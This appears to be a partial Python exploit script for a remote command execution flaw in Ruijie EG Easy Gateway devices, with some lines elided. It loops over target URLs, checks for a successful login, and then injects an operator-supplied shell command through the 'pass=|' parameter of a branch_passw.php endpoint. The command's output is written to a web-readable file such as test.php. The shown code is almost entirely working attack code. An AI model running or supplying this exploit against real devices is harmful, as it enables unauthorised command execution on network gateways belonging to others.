...
def task(url_dict: dict, command: str = None):
    ...
    cmd_url = "/itbox_pi/branch_passw.php?a=set"
    ...
    for url in urls:
        ...
        if str(data.get('data', '0')) == '0' and str(data.get('status', '0')) == '1':
            print(f"{url} 能够成功登录，")
        code, content = run_switch_command(_session, url + cmd_url, command=command)
        if code != 200:
            continue
        print(f"{content}请访问相关路径")


def run_switch_command(_session: requests.Session, url: str, command: str = None, encoding: str = 'UTF-8') -> (int, str):
    print("=" * 100)
    print("Due to the lack of echo utilization during command execution, it is necessary to output the results of the content to be executed to a file, and then directly access the file to obtain the results")
    command = input("Please input the command(such as id > test.php):") if command is None or not command else command
    if command is None or not command:
        command = "id > test.php"
    cmd_data = "pass=|"+command
...
def set_cmd_arg() -> any:
    description = 'Ruijie EG Easy Gateway CLIPHP Remote Command Execution Vulnerability'
